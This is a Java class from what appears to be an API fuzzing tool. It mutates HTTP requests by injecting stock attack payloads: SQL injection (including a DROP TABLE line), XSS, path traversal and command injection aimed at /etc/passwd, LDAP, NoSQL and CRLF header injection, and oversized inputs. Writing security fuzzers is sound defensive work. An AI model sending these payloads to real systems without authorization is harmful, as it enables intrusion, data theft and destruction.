package com.apifuzzer.generation;

import com.apifuzzer.model.RequestSpec;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class PayloadMutator implements MutationStrategy {

    private static final String[] SQL_INJECTION = {
        "' OR '1'='1", "' OR '1'='1' --", "' UNION SELECT NULL --",
        "1; DROP TABLE users --", "' OR 1=1 --", "admin' --",
        "' OR 'x'='x", "') OR ('1'='1", "1' OR '1'='1"
    };

    private static final String[] XSS_PAYLOADS = {
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>", "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>"
    };

    private static final String[] PATH_TRAVERSAL = {
        "../../etc/passwd", "..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2fetc%2fpasswd", "..%c0%af..%c0%afetc%c0%afpasswd"
    };

    private static final String[] COMMAND_INJECTION = {
        "; cat /etc/passwd", "| cat /etc/passwd", "`cat /etc/passwd`",
        "$(cat /etc/passwd)", "&& cat /etc/passwd", "; ls -la",
        "| whoami", "`id`", "$(id)"
    };

    private static final String[] LDAP_INJECTION = {
        "*)(|(userPassword=*))", "*)(cn=*))", "*))(|(objectClass=*))"
    };

    private static final String[] NO_SQL_INJECTION = {
        "{$ne: null}", "{$gt: \"\"}", "{$where: \"1==1\"}",
        "{\"$ne\": 1}", "{\"$gt\": \"\"}", "{\"$regex\": \".*\"}"
    };

    private static final String[] HEADER_INJECTION = {
        "\r\nX-Injected: true", "\nX-Injected: true",
        "%0d%0aX-Injected: true", "\r\nContent-Length: 0"
    };

    private static final String[] OVERSIZED = generateOversizedPayloads();

    private final Random random = ThreadLocalRandom.current();

    @Override
    public List<RequestSpec> mutate(RequestSpec original, int count) {
        List<RequestSpec> mutations = new ArrayList<>();
        for (int i = 0; i < count; i++) {
            mutations.add(createMutation(original));
        }
        return mutations;
    }

    private RequestSpec createMutation(RequestSpec original) {
        RequestSpec mutated = deepCopy(original);
        int strategy = random.nextInt(8);

        switch (strategy) {
            case 0 -> mutateBody(mutated, SQL_INJECTION);
            case 1 -> mutateBody(mutated, XSS_PAYLOADS);
            case 2 -> mutateBody(mutated, PATH_TRAVERSAL);
            case 3 -> mutateBody(mutated, COMMAND_INJECTION);
            case 4 -> mutateBody(mutated, LDAP_INJECTION);
            case 5 -> mutateBody(mutated, NO_SQL_INJECTION);
            case 6 -> mutateHeaders(mutated);
            case 7 -> mutateBody(mutated, OVERSIZED);
        }

        mutated.setId(original.getId() + "-mut-" + System.nanoTime());
        mutated.setTestStrategy(getName());
        mutated.setSeedId(original.getSeedId());
        return mutated;
    }

    private void mutateBody(RequestSpec spec, String[] payloads) {
        String payload = payloads[random.nextInt(payloads.length)];
        String body = spec.getBody();

        if (body == null || body.isEmpty()) {
            spec.setBody(payload);
        } else if (body.startsWith("{") && body.endsWith("}")) {
            spec.setBody(injectIntoJson(body, payload));
        } else if (body.contains("=") && body.contains("&")) {
            spec.setBody(injectIntoForm(body, payload));
        } else {
            spec.setBody(body + payload);
        }
    }

    private String injectIntoJson(String json, String payload) {
        int insertPos = json.length() - 1;
        return json.substring(0, insertPos) + ", \"fuzz\": \"" + escapeJson(payload) + "\"}";
    }

    private String injectIntoForm(String form, String payload) {
        return form + "&fuzz=" + java.net.URLEncoder.encode(payload, java.nio.charset.StandardCharsets.UTF_8);
    }

    private void mutateHeaders(RequestSpec spec) {
        Map<String, String> headers = new java.util.HashMap<>(spec.getHeaders());
        String injection = HEADER_INJECTION[random.nextInt(HEADER_INJECTION.length)];
        headers.put("X-Forwarded-For", "127.0.0.1" + injection);
        headers.put("X-Original-URL", "/admin" + injection);
        headers.put("Referer", "https://evil.com" + injection);
        spec.setHeaders(headers);
    }

    private String escapeJson(String input) {
        return input.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    private RequestSpec deepCopy(RequestSpec original) {
        RequestSpec copy = new RequestSpec();
        copy.setId(original.getId());
        copy.setMethod(original.getMethod());
        copy.setUrl(original.getUrl());
        copy.setHeaders(new java.util.HashMap<>(original.getHeaders()));
        copy.setBody(original.getBody());
        copy.setTestStrategy(original.getTestStrategy());
        copy.setAuthProfile(original.getAuthProfile());
        copy.setSeedId(original.getSeedId());
        return copy;
    }

    private static String[] generateOversizedPayloads() {
        String[] payloads = new String[5];
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 10000; i++) sb.append('A');
        payloads[0] = sb.toString();
        for (int i = 0; i < 50000; i++) sb.append('B');
        payloads[1] = sb.toString();
        payloads[2] = "A".repeat(100000);
        payloads[3] = "<tag>".repeat(5000) + "</tag>".repeat(5000);
        payloads[4] = "{\"key\": \"" + "x".repeat(50000) + "\"}";
        return payloads;
    }

    @Override
    public String getName() {
        return "PAYLOAD_MUTATOR";
    }

    @Override
    public String getDescription() {
        return "Injects security payloads (SQLi, XSS, Path Traversal, Command Injection, NoSQL, LDAP, Header Injection, Oversized)";
    }
}